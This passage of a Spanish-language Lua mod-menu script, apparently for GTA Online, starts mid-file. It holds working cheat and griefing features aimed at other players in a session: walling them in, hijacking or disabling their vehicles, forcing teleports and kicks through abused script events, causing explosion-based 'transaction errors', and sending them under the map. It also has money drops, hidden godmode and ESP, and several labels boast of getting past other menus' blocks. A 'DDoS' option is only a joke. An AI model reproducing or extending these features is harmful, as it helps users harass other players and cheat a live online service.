            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 10
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy - 10
            c.x = defx - 19
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = defx - 3
            c.y = defy + 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = defx + 25
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x + 7
            c.y = defy
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = defy - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y - 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 7.5
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            c.y = c.y - 3.1
            c.x = c.x + 5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)

            util.yield(600)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
            util.yield(500)
            entities.delete_by_handle(veh)
        else
            util.toast(players.get_name(player_id).. " No esta en un vehiculo")
        end
    end)

    local control_veh
    control_veh = menu.toggle_loop(trolling, "Controlar vehiculo del jugador", {}, "Solo funciona en vehiculos terrestres.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if not players.exists(player_id) then util.stop_thread() end

        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            util.toast("Jugador muy lejos. :/")
            menu.set_value(control_veh, false)
        return end

        if class == 15 then
            util.toast("Jugador en helicoptero. :/")
            menu.set_value(control_veh, false)
        return end
        
        if class == 16 then
            util.toast("Jugador en avion. :/")
            menu.set_value(control_veh, false)
        return end

        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            if PAD.IS_CONTROL_PRESSED(0, 34) then
                while not PAD.IS_CONTROL_RELEASED(0, 34) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                while not PAD.IS_CONTROL_RELEASED(0, 35) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                while not PAD.IS_CONTROL_RELEASED(0, 32) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                while not PAD.IS_CONTROL_RELEASED(0, 33) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                    util.yield()
                end
            end
        else
            util.toast("El jugador no esta en un vehiculo. :/")
            menu.set_value(control_veh, false)
        end
        util.yield()
    end)

    menu.action(trolling, "DDoS", {}, "Los ddosea uwu", function()
        util.toast("Se le envio un ataque ddos a " ..players.get_name(player_id))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(3000)
        util.toast("Es broma, que esperabas?")
    end)

    menu.action(friendly, "Fix Pantalla De Carga", {}, "Les arreglara la pantalla de carga infinita con un metodo.", function()
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        menu.trigger_commands("aptme" .. players.get_name(player_id))
    end)

    menu.action(friendly, "Darles Nivel", {}, "Les subira el nivel de gta. \nPosible crash.", function()
        util.trigger_script_event(1 << player_id, {697566862, player_id, 5, 0, 1, 1, 1})
        for i = 0, 9 do
            util.trigger_script_event(1 << player_id, {697566862, player_id, 0, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 1, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 10, i, 1, 1, 1})
        end
        for i = 0, 1 do
            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 6, i, 1, 1, 1})
        end
        for i = 0, 19 do
            util.trigger_script_event(1 << player_id, {697566862, player_id, 4, i, 1, 1, 1})
        end
        for i = 0, 99 do
            util.trigger_script_event(1 << player_id, {697566862, player_id, 9, i, 1, 1, 1})
            util.yield()
        end
    end)

    menu.toggle_loop(friendly, "Dar godmode Silencioso", {}, "No lo detectaran mod menus gratuitos", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(ped), true, true, true, true, true, false, false, true)
        end, function() 
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(ped), false, false, false, false, false, false, false, false)
    end)

    menu.toggle_loop(friendly, "Dar fichas del casino", {"dropchips"}, "Se testeo por 3 semanas y parece seguro, sin embargo puede ser detectado en cualquier momento", function(toggle)
        local coords = players.get_position(player_id)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_lux_card_01a")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
    end)

    menu.toggle(friendly, "Money Drop", {}, "Es literalmente money drop, el que todos conocimos. \nNo se testeo, no me hare responsable de baneos.", function(on_toggle)
        local coords = players.get_position(player_id)
        coords.z = coords.z + 1.5
        if on_toggle then
            util.yield(50)
            menu.trigger_commands("ceopay".. players.get_name(player_id))
            menu.trigger_commands("rp".. players.get_name(player_id))
            menu.trigger_commands("cards".. players.get_name(player_id))
        else
            util.yield(50)
            menu.trigger_commands("ceopay".. players.get_name(player_id))
            menu.trigger_commands("rp".. players.get_name(player_id))
            menu.trigger_commands("cards".. players.get_name(player_id))
        end
        --menu.trigger_commands("cash".. players.get_name(player_id) .. " 1")
    end)

    menu.action(friendly, "Dar vida y armadura", {}, "", function()
        menu.trigger_commands("autoheal"..players.get_name(player_id))
    end)

    menu.action(friendly, "Ganar daño criminal", {}, "Haslos ganar el desafio siempre", function()
        local fcartable = {}

        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local defz = c.z
        STREAMING.REQUEST_MODEL(expcar)
        while not STREAMING.HAS_MODEL_LOADED(expcar) do
            STREAMING.REQUEST_MODEL(expcar)
            util.yield()
        end
        STREAMING.REQUEST_MODEL(floorbr)
        while not STREAMING.HAS_MODEL_LOADED(floorbr) do
            STREAMING.REQUEST_MODEL(floorbr)
            util.yield()
        end
        local success, floorcoords
        repeat
            success, floorcoords = util.get_ground_z(c.x, c.y)
            util.yield()
        until success
        floorcoords = floorcoords - 100
        c.z = floorcoords
        local floorrigp = entities.create_object(floorbr, c)
        c.z = defz
        c.z = c.z - 95 
        for i = 1, 22 do
            fcartable[#fcartable + 1] = entities.create_vehicle(expcar, c, 0) 
        end
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(p, c.x, c.y, floorcoords, exp, 100.0, true, false, 1.0) 
        util.yield(500)
        entities.delete_by_handle(floorrigp)
        util.yield(1000)
        
        for i = 1, #fcartable do
            entities.delete_by_handle(fcartable[i]) 
            fcartable[i] = nil
        end
    end)

    menu.toggle_loop(friendly, "Ganar Checkpoints", {}, "Haslos ganar los checkpoints del desafio", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        if PED.IS_PED_IN_ANY_VEHICLE(p) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
            RequestControl(veh)
            local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
            local cdblip = HUD.GET_BLIP_COORDS(dblip)
            ENTITY.SET_ENTITY_COORDS(veh, cdblip.x, cdblip.y, cdblip.z, false, false, false, false)
            util.yield(1500)
        else
            util.toast(players.get_name(player_id).. " Tiene que estar en un vehiculo")
        end
    end)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- Vehicle


    menu.action(vehicle, "Reparar Vehiculo", {}, "Les repara el vehiculo", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
            util.toast(players.get_name(player_id) .. " vehiculo reparado")
        else
            VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
        end
    end)

    local desv = menu.list(vehicle, "Deshabilitar vehiculos.", {}, "")

    menu.action(desv, "Deshabilitar Vehiculo", {}, "Es mejor que el de stand", function(toggle)
        --local pos = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
        --ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, 1, false)
    end)

    menu.action(desv, "Deshabilitar Vehiculo V2", {}, "Inbloqueable por stand", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        local is_running = VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(player_vehicle)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
            util.toast(players.get_name(player_id) .. " Motor jodido")
        else
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
        end
    end)

    menu.toggle_loop(desv, "Deshabilitar Vehiculo Loop", {}, "Es mejor que el de stand", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
    end)

    local modv = menu.list(vehicle, "Modificar vehiculo.", {}, "")

    menu.action(modv, "Upgrades Random", {}, "Les pondra mejoras random.", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        local ped = PLAYER.GET_PLAYER_PED(players.user())
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false) 
        menu.trigger_commands("tp"..players.get_name(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("godmode on")
        util.yield(4000)
        if ENTITY.DOES_ENTITY_EXIST(veh) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            local getm = VEHICLE.GET_NUM_VEHICLE_MODS(veh)
            for i = 0, 70 do
                VEHICLE.SET_VEHICLE_MOD(veh, i, getm, -1, false)

            end
        else
            util.toast("Error al obtener control sobre el vehiculo.")
        end
        util.yield(500)
        menu.trigger_commands("tp"..players.get_name(player_id))
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("godmode off")
        ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, 1, false)
    end)

    menu.toggle(modv, "Upgrades Random (Loop)", {}, "Les pondra mejoras random.", function(on)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        local ped = PLAYER.GET_PLAYER_PED(players.user())
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false) 
        if on then
            menu.trigger_commands("invisibility on")
            menu.trigger_commands("godmode on")
            util.yield(200)
            menu.trigger_commands("tp"..players.get_name(player_id))
            util.yield(4000)
            if ENTITY.DOES_ENTITY_EXIST(veh) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                local getm = VEHICLE.GET_NUM_VEHICLE_MODS(veh)
                for i = 0, 70 do
                    VEHICLE.SET_VEHICLE_MOD(veh, i, getm, -1, false)
    
                end
            else
                util.toast("Error al obtener control sobre el vehiculo.")
            end
        else
            menu.trigger_commands("tp"..players.get_name(player_id))
            menu.trigger_commands("invisibility off")
            menu.trigger_commands("godmode off")
            ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, 1, false)
        end
    end)

    menu.toggle(modv, "Empuje Por Sonido", {}, "Les dara un empuje cuando usen el claxon del vehiculo.", function()
        local player = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        if AUDIO.IS_HORN_ACTIVE(player_vehicle) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 10000, 0.0, true, true, true, true)
        end
    end)

    menu.toggle(modv, "Salto Por Sonido", {}, "Les hara hacer un salto cuando usen el claxon del vehiculo.", function()
        local player = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        if AUDIO.IS_HORN_ACTIVE(player_vehicle) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 0.0, 10000, true, true, true, true)
        end
    end)
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    -- Other

    local sevents = menu.list(otherc, "Eventos", {}, "Eventos creados por scripts.")

    local tps = menu.list(sevents, "Tp's", {}, "Eventos de tp a jugadores.") 

    menu.action(tps, "Cayo Perico", {}, "Intentara varios metodos a enviar a cayo. \nSi no tiene menu muy bueno funcionara. \nHay posibilidad que funcione con Stand.", function()
        menu.trigger_commands("scripthost")
        for i = 1, 200 do
            util.trigger_script_event(1 << player_id, {-910497748, player_id, 1, 0})
        end
    end)

    menu.action(tps, "Cayo Perico SC", {}, "Intentara varios metodos de enviar a cayo. \nSin cinematica.", function()
        menu.trigger_commands("scripthost")
        for i = 1, 200 do
            util.trigger_script_event(1 << player_id, {-93722397, player_id, 0, 0, 4, 1})
        end
    end)

    menu.action(tps, "Kickeado de cayo perico", {}, "Bloqueado por la mayoria de menus.", function()
        menu.trigger_commands("scripthost")
        util.trigger_script_event(1 << player_id, {-93722397, player_id, 0, 0, 4, 0})
    end)

    menu.action(tps, "Golpe Pasado", {}, "Bloqueado por la mayoria de menus.", function()
        menu.trigger_commands("scripthost")
        util.trigger_script_event(1 << player_id, {-168599209, players.user(), player_id, -1, 1, 1, 0, 1, 0}) 
    end) 

    menu.action(tps, "Trapo Al Jugador", {}, "", function()
        menu.trigger_commands("scripthost")
        util.trigger_script_event(1 << player_id, {2009283752247, player_id, 2005749727232, 1, 258, 1, 1, player_id, 2701534429183, 18, 0})
    end)

    local fuckrs = menu.list(sevents, "Rompedores", {}, "Eventos que les jodera.")

    menu.action(fuckrs, "Error De Transaccion", {}, "Es inconcistente pero funciona.", function()
        if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_destroy_veh")) == 0 then
            util.request_script_host("freemode")
            while players.get_script_host() ~= players.user() do util.yield_once() end
            local sscript = menu.ref_by_path("Online>Session>Session Scripts>Run Script>Removed Freemode Activities>Destroy Vehicle")
            menu.trigger_command(sscript)
            while SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_destroy_veh")) == 0 do
                util.yield(1000)
            end
        end
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(225) == 0 and 348 or 225
        local coords = get_blip_coords(blip)
        local explodeTargetVeh = function()
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
            local handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
            local oldPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
            ENTITY.SET_ENTITY_COORDS(handle, coords.x, coords.y + 20, coords.z, false, false, false, false)
            util.yield(1000)
            coords = get_blip_coords(blip)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), coords.x, coords.y, coords.z, 4, 50, false, true, 0.0)
            handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS(handle, oldPos.x, oldPos.y, oldPos.z, false, false, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), coords.x, coords.y, coords.z, 4, 50, false, true, 0.0)
        end
        if coords.x ~= 0 and coords.y ~= 0 and coords.z ~= 0 then
            explodeTargetVeh()
        else
            util.yield(2500)
            coords = get_blip_coords(blip)
            while coords.x == 0 do
                coords = get_blip_coords(blip)
                util.yield_once()
            end
            explodeTargetVeh()
        end
    end)

    --[[
            menu.action(fuckrs, "Kickear Del Vehiculo", {}, "", function()
        local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, true)
        local myveh = PED.GET_VEHICLE_PED_IS_IN(pped, true)
        PED.SET_PED_INTO_VEHICLE(pped, veh, -2)
        util.yield(50)
        ryze.ChangeNetObjOwner(veh, player_id)
        ryze.ChangeNetObjOwner(veh, pped)
        util.yield(50)
        PED.SET_PED_INTO_VEHICLE(pped, myveh, -1)
    end)
    ]]
    
    menu.action(fuckrs, "Enviarlos Al Infierno", {}, "Los teletransportara abajo del mapa. \nNecesitara estar en un vehiculo.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        c.z = c.z - 100
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            RequestControl(veh)
            floorcoords = floorcoords - 50
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, floorcoords, false, false, false, false) --tp undermap
        else
            util.toast(players.get_name(player_id).. " no esta en un vehiculo.")
        end
    end)

    menu.action(otherc, "Marca Del Jugador", {}, "Deberia mostrar la marca que el jugador tenga en el mapa.", function()    
        local playerw = players.get_waypoint(player_id)
        for i = 1, 5 do
            HUD.REFRESH_WAYPOINT()
        end
        HUD.SET_NEW_WAYPOINT(playerw, playerw, false)
        util.yield(2000)
        util.toast("La marca del jugador ya deberia estar en el mapa.")
        util.yield(500)
        util.toast("Tal vez no tenga marca si no sale.")
    end)

    menu.toggle(otherc, "Spectear Automatico", {}, "Usara un metodo u otro dependiendo su estado.", function(on)
        local spec_2 = menu.ref_by_rel_path(menu.player_root(player_id), "Spectate>Ninja Method")
        local spec_1 = menu.ref_by_rel_path(menu.player_root(player_id), "Spectate>Legit Method")
        if on then
            if ryze.get_interior_of_player(player_id) == 0 then
                spec_1.value = false
                spec_2.value = true
            else
                spec_2.value = false
                spec_1.value = true
            end 
        else 
            menu.trigger_commands("stopspectating")
        end 

    end)

    menu.toggle_loop(otherc, "ESP", {}, "Crea una linea recta hacia ellos.", function()
        local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local j = ENTITY.GET_ENTITY_COORDS(p)
        GRAPHICS.DRAW_LINE(c.x, c.y, c.z, j.x, j.y, j.z, 255, 255, 255, 255)
    end)
        
end)

menu.toggle_loop(world, "Mejorar El Anti-Restriccion", {}, "Mejora el anti-restriccion de stand, podras saltar en interiores.", function()
    if not PAD.IS_CONTROL_ENABLED(0, 22) and not menu.command_box_is_open() then
        if PAD.IS_DISABLED_CONTROL_JUST_PRESSED(0, 22) then
            MISC.SET_FORCED_JUMP_THIS_FRAME(players.user())
        end
    end
end)

menu.toggle(world, "Sin Trafico", {}, "Quitara los peds en vehiculos alrededor del mundo. \nNetWorked", function(toggle)
    local pop_multiplier_id
    if toggle then
        local ped_sphere, traffic_sphere
        if ryze.disable_peds then ped_sphere = 0.0 else ped_sphere = 1.0 end
        if ryze.disable_traffic then traffic_sphere = 0.0 else traffic_sphere = 1.0 end
        pop_multiplier_id = MISC.ADD_POP_MULTIPLIER_SPHERE(1.1, 1.1, 1.1, 15000.0, ped_sphere, traffic_sphere, false, true)
        MISC.CLEAR_AREA(1.1, 1.1, 1.1, 19999.9, true, false, false, true)
    else
        MISC.REMOVE_POP_MULTIPLIER_SPHERE(pop_multiplier_id, false);
    end
end)

menu.toggle_loop(world, "Quitar Claxon", {}, "Deshabilita todos los claxons cerca tuyo.", function()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        AUDIO.SET_HORN_ENABLED(vehicle, false)
    end
end)

menu.action(world, "Limpiar Area", {"rcleararea"}, "Limpia todo en el area", function(on_click)
    clear_area(clear_radius)
    util.toast('Area limpia:3')
end)

menu.action(world, "Limpiar Mundo", {"rclearworld"}, "Limpia literalmente todo lo del area incluyendo peds, coches, objetos, bools etc.", function(on_click)
    clear_area(1000000)
    util.toast('Mundo limpio :3')
end)

menu.slider(world, "Radio de limpiar", {}, "Radio para limpiar", 100, 10000, 100, 100, function(s)
    radius = s
end)


--------------------------------------------------------------------------------------------------------------------------------
--Detecciones
menu.toggle_loop(detections, "GodMode", {}, "Saldra si se detecta godmode.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if players.is_godmode(player_id) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and ryze.get_spawn_state(player_id) == 99 and ryze.get_interior_of_player(player_id) == interior then
                util.draw_debug_text(players.get_name(player_id) .. " Tiene Godmode")
                break
            end
        end
    end 
end)

menu.toggle_loop(detections, "Godmode De Coche", {}, "Saldra si se detecta godmode en el carro.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and ryze.get_spawn_state(player_id) == 99 and ryze.get_interior_of_player(player_id) == interior then
                    util.draw_debug_text(players.get_name(player_id) .. " Esta en carro con godmode")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(detections, "Arma Modeada", {}, "Dira si tiene algun arma giveada", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        for i, hash in ipairs(ryze.modded_weapons) do
            local weapon_hash = util.joaat(hash)
